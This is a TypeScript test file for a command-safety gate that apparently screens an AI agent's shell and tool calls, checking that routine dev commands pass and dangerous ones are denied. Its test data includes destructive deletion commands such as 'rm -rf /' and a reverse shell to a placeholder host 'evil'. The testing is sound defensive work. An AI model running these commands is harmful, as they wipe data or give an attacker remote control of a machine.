import { describe, it, expect } from 'vitest';
import { deepInspect } from '../deep-inspect.js';
import { evaluateInlineJury } from '../jury-evaluator.js';
import { classifyCommand, classifyTool } from '../risk-classifier.js';
import { mergeWithDefaults } from '../default-config.js';
import type { JuryContext } from '../types.js';

function bashCtx(command: string): JuryContext {
  return { toolName: 'Bash', toolInput: { command }, cwd: '/project' };
}

describe('Full Pipeline Integration', () => {
  describe('safe dev commands pass entire pipeline', () => {
    const safeCommands = [
      'ls -la', 'cat README.md', 'git status', 'npm run build',
      'tsc --noEmit', 'eslint src/', 'jest --coverage', 'node --version',
      'grep -r "function" src/', 'find . -name "*.ts"',
    ];
    for (const cmd of safeCommands) {
      it(`allows: ${cmd}`, () => {
        const inspect = deepInspect(cmd);
        expect(inspect.blocked).toBe(false);
        const jury = evaluateInlineJury(bashCtx(cmd));
        expect(jury.verdict).toBe('APPROVED');
      });
    }
  });

  describe('dangerous commands blocked at deep-inspect', () => {
    const dangerous = [
      'bash -c "rm -rf /"',
      'python3 -c "import os; os.remove(x)"',
      'eval "rm -rf /"',
    ];
    for (const cmd of dangerous) {
      it(`blocks: ${cmd}`, () => {
        expect(deepInspect(cmd).blocked).toBe(true);
      });
    }
  });

  describe('dangerous commands blocked at jury', () => {
    it('blocks rm -rf / via safety veto', () => {
      const result = evaluateInlineJury(bashCtx('rm -rf /'));
      expect(result.verdict).toBe('DENIED');
    });
    it('blocks reverse shell', () => {
      const result = evaluateInlineJury(bashCtx('bash -i >& /dev/tcp/evil/4444'));
      expect(result.verdict).toBe('DENIED');
    });
  });

  describe('risk classifier aligns with jury', () => {
    it('low risk commands get approved', () => {
      const risk = classifyCommand('git status');
      expect(risk.level).toBe('low');
      const jury = evaluateInlineJury(bashCtx('git status'));
      expect(jury.verdict).toBe('APPROVED');
    });
    it('critical risk commands get denied', () => {
      const risk = classifyCommand('sudo rm -rf /');
      expect(risk.level).toBe('critical');
    });
  });

  describe('default config provides coverage', () => {
    it('empty config produces full defaults', () => {
      const config = mergeWithDefaults({});
      expect(config.always_allow_tools.length).toBeGreaterThan(5);
      expect(config.always_deny_bash_patterns.length).toBeGreaterThan(10);
      expect(config.always_allow_bash_patterns.length).toBeGreaterThan(30);
    });
  });

  describe('read-only tools always pass', () => {
    const readTools = ['Read', 'Glob', 'Grep', 'LS', 'WebSearch', 'TodoRead'];
    for (const tool of readTools) {
      it(`approves: ${tool}`, () => {
        const ctx: JuryContext = { toolName: tool, toolInput: {}, cwd: '/project' };
        const result = evaluateInlineJury(ctx);
        expect(result.verdict).toBe('APPROVED');
        const risk = classifyTool(tool);
        expect(risk.level).toBe('none');
      });
    }
  });
});
